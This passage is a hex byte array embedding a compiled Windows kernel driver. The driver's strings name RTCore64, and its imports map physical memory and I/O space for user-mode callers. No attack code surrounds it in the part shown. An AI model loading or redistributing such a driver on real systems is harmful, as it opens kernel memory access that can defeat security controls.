	  0x00, 0xff, 0x15, 0x79, 0x06, 0x00, 0x00, 0x89, 0x5f, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x18, 0x00,
	  0x00, 0x00, 0xeb, 0x19, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xeb, 0x10, 0xc7, 0x47, 0x30,
	  0x0d, 0x00, 0x00, 0xc0, 0xeb, 0x07, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0x8b, 0x5f, 0x30,
	  0x32, 0xd2, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0xb5, 0x06, 0x00, 0x00, 0x8b, 0xc3, 0x48, 0x83, 0xc4,
	  0x48, 0x5f, 0x5b, 0xc3, 0x51, 0x01, 0x00, 0x00, 0x7d, 0x01, 0x00, 0x00, 0xa9, 0x01, 0x00, 0x00,
	  0xd7, 0x01, 0x00, 0x00, 0x06, 0x02, 0x00, 0x00, 0x31, 0x02, 0x00, 0x00, 0x78, 0x02, 0x00, 0x00,
	  0xc1, 0x02, 0x00, 0x00, 0x08, 0x03, 0x00, 0x00, 0x35, 0x03, 0x00, 0x00, 0x7b, 0x03, 0x00, 0x00,
	  0xd0, 0x03, 0x00, 0x00, 0xe0, 0x00, 0x00, 0x00, 0x19, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x70, 0x00, 0x00, 0x00, 0x1d, 0x04, 0x00, 0x00, 0x88, 0x04, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00,
	  0x00, 0x12, 0x12, 0x12, 0x01, 0x12, 0x12, 0x12, 0x02, 0x12, 0x12, 0x12, 0x03, 0x12, 0x12, 0x12,
	  0x04, 0x12, 0x12, 0x12, 0x05, 0x12, 0x12, 0x12, 0x06, 0x12, 0x12, 0x12, 0x07, 0x12, 0x12, 0x12,
	  0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x08, 0x12, 0x12, 0x12, 0x09, 0x12, 0x12, 0x12,
	  0x0a, 0x12, 0x12, 0x12, 0x0b, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
	  0x0c, 0x12, 0x12, 0x12, 0x0d, 0x12, 0x12, 0x12, 0x0e, 0x12, 0x12, 0x12, 0x0f, 0x12, 0x12, 0x12,
	  0x10, 0x12, 0x12, 0x12, 0x11, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	  0x53, 0x57, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48,
	  0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	  0x53, 0x57, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48,
	  0x83, 0xc4, 0x30, 0x5d, 0x5f, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	  0x53, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x15, 0x61, 0x15, 0x00, 0x00, 0x48,
	  0x8d, 0x4c, 0x24, 0x48, 0xff, 0x15, 0x96, 0x05, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x1f, 0x15, 0x00,
	  0x00, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0xff, 0x15, 0x84, 0x05, 0x00, 0x00, 0x48, 0x8d, 0x44, 0x24,
	  0x40, 0x48, 0x89, 0x44, 0x24, 0x30, 0xc6, 0x44, 0x24, 0x28, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x00,
	  0x00, 0x00, 0x00, 0x41, 0xb9, 0x22, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x44, 0x24, 0x48, 0x33, 0xd2,
	  0x48, 0x8b, 0xcb, 0xff, 0x15, 0x4f, 0x05, 0x00, 0x00, 0x85, 0xc0, 0x7c, 0x3a, 0x48, 0x8d, 0x54,
	  0x24, 0x48, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0xff, 0x15, 0x33, 0x05, 0x00, 0x00, 0x85, 0xc0, 0x7c,
	  0x26, 0x48, 0x8d, 0x05, 0x18, 0xf9, 0xff, 0xff, 0x48, 0x89, 0x43, 0x70, 0x48, 0x89, 0x83, 0x80,
	  0x00, 0x00, 0x00, 0x48, 0x89, 0x83, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x05, 0xaf, 0xf4, 0xff,
	  0xff, 0x48, 0x89, 0x43, 0x68, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x70, 0x5b, 0xc3, 0xcc, 0xff, 0x25,
	  0xdc, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x1e, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x38, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x24, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3a, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x56, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x76, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1a, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0xa4, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbc, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0xce, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe6, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x02, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x8e, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd8, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x05, 0x02, 0x00, 0x05, 0x52, 0x01, 0x30,
	  0x01, 0x06, 0x03, 0x00, 0x06, 0x82, 0x02, 0x70, 0x01, 0x30, 0x00, 0x00, 0x01, 0x0e, 0x07, 0x00,
	  0x0e, 0x01, 0x1a, 0x00, 0x07, 0xd0, 0x05, 0xc0, 0x03, 0x70, 0x02, 0x60, 0x01, 0x30, 0x00, 0x00,
	  0x01, 0x05, 0x02, 0x00, 0x05, 0x72, 0x01, 0x30, 0x01, 0x07, 0x04, 0x00, 0x07, 0x52, 0x03, 0x50,
	  0x02, 0x70, 0x01, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x07, 0x04, 0x00,
	  0x07, 0x52, 0x03, 0x50, 0x02, 0x70, 0x01, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x09, 0x0b, 0x03, 0x00, 0x0b, 0x82, 0x07, 0x70, 0x06, 0x30, 0x00, 0x00, 0x5e, 0x1b, 0x00, 0x00,
	  0x02, 0x00, 0x00, 0x00, 0x36, 0x18, 0x00, 0x00, 0x69, 0x18, 0x00, 0x00, 0xa0, 0x1a, 0x00, 0x00,
	  0x69, 0x18, 0x00, 0x00, 0x8b, 0x18, 0x00, 0x00, 0xb6, 0x18, 0x00, 0x00, 0x80, 0x1a, 0x00, 0x00,
	  0xb6, 0x18, 0x00, 0x00, 0x01, 0x05, 0x02, 0x00, 0x05, 0xd2, 0x01, 0x30, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x5c, 0x00, 0x44, 0x00, 0x6f, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00,
	  0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x52, 0x00, 0x54, 0x00, 0x43, 0x00, 0x6f, 0x00,
	  0x72, 0x00, 0x65, 0x00, 0x36, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x5c, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5c, 0x00,
	  0x52, 0x00, 0x54, 0x00, 0x43, 0x00, 0x6f, 0x00, 0x72, 0x00, 0x65, 0x00, 0x36, 0x00, 0x34, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x10, 0x00, 0x00, 0x35, 0x10, 0x00, 0x00, 0x98, 0x20, 0x00, 0x00, 0x60, 0x10, 0x00, 0x00,
	  0x13, 0x11, 0x00, 0x00, 0xa0, 0x20, 0x00, 0x00, 0x20, 0x11, 0x00, 0x00, 0x6e, 0x13, 0x00, 0x00,
	  0xac, 0x20, 0x00, 0x00, 0xa0, 0x13, 0x00, 0x00, 0x1e, 0x14, 0x00, 0x00, 0xc0, 0x20, 0x00, 0x00,
	  0x50, 0x14, 0x00, 0x00, 0x75, 0x1a, 0x00, 0x00, 0xf0, 0x20, 0x00, 0x00, 0x80, 0x1a, 0x00, 0x00,
	  0x97, 0x1a, 0x00, 0x00, 0xdc, 0x20, 0x00, 0x00, 0xa0, 0x1a, 0x00, 0x00, 0xb7, 0x1a, 0x00, 0x00,
	  0xc8, 0x20, 0x00, 0x00, 0xc0, 0x1a, 0x00, 0x00, 0x5d, 0x1b, 0x00, 0x00, 0x24, 0x21, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x60, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf8, 0x51, 0x00, 0x00,
	  0x20, 0x20, 0x00, 0x00, 0x40, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x50, 0x52, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x1e, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x38, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x24, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3a, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x56, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x76, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1a, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0xa4, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbc, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0xce, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe6, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x02, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x8e, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd8, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4a, 0x01, 0x49, 0x6f, 0x44, 0x65, 0x6c, 0x65,
	  0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0x4c, 0x01, 0x49, 0x6f, 0x44, 0x65,
	  0x6c, 0x65, 0x74, 0x65, 0x53, 0x79, 0x6d, 0x62, 0x6f, 0x6c, 0x69, 0x63, 0x4c, 0x69, 0x6e, 0x6b,
	  0x00, 0x00, 0x12, 0x04, 0x52, 0x74, 0x6c, 0x49, 0x6e, 0x69, 0x74, 0x55, 0x6e, 0x69, 0x63, 0x6f,
	  0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x00, 0x00, 0xf7, 0x04, 0x5a, 0x77, 0x43, 0x6c,
	  0x6f, 0x73, 0x65, 0x00, 0x19, 0x05, 0x5a, 0x77, 0x4d, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4f,
	  0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0x27, 0x03, 0x4f, 0x62, 0x52, 0x65,
	  0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x42, 0x79, 0x48,
	  0x61, 0x6e, 0x64, 0x6c, 0x65, 0x00, 0x25, 0x05, 0x5a, 0x77, 0x4f, 0x70, 0x65, 0x6e, 0x53, 0x65,
	  0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0xad, 0x02, 0x4d, 0x6d, 0x4d, 0x61, 0x70, 0x49, 0x6f, 0x53,
	  0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0x67, 0x05, 0x5f, 0x5f, 0x43, 0x5f, 0x73, 0x70, 0x65, 0x63,
	  0x69, 0x66, 0x69, 0x63, 0x5f, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x00, 0x00, 0xdf, 0x01,
	  0x49, 0x6f, 0x66, 0x43, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x52, 0x65, 0x71, 0x75, 0x65,
	  0x73, 0x74, 0x00, 0x00, 0x62, 0x05, 0x5a, 0x77, 0x55, 0x6e, 0x6d, 0x61, 0x70, 0x56, 0x69, 0x65,
	  0x77, 0x4f, 0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0xcb, 0x02, 0x4d, 0x6d,
	  0x55, 0x6e, 0x6d, 0x61, 0x70, 0x49, 0x6f, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0x40, 0x01,
	  0x49, 0x6f, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x79, 0x6d, 0x62, 0x6f, 0x6c, 0x69, 0x63,
	  0x4c, 0x69, 0x6e, 0x6b, 0x00, 0x00, 0x37, 0x01, 0x49, 0x6f, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
	  0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0x6e, 0x74, 0x6f, 0x73, 0x6b, 0x72, 0x6e, 0x6c,
	  0x2e, 0x65, 0x78, 0x65, 0x00, 0x00, 0x13, 0x00, 0x48, 0x61, 0x6c, 0x47, 0x65, 0x74, 0x42, 0x75,
	  0x73, 0x44, 0x61, 0x74, 0x61, 0x42, 0x79, 0x4f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x00, 0x30, 0x00,
	  0x48, 0x61, 0x6c, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x6c, 0x61, 0x74, 0x65, 0x42, 0x75, 0x73, 0x41,
	  0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x25, 0x00, 0x48, 0x61, 0x6c, 0x53, 0x65, 0x74,
	  0x42, 0x75, 0x73, 0x44, 0x61, 0x74, 0x61, 0x42, 0x79, 0x4f, 0x66, 0x66, 0x73, 0x65, 0x74, 0x00,
	  0x48, 0x41, 0x4c, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
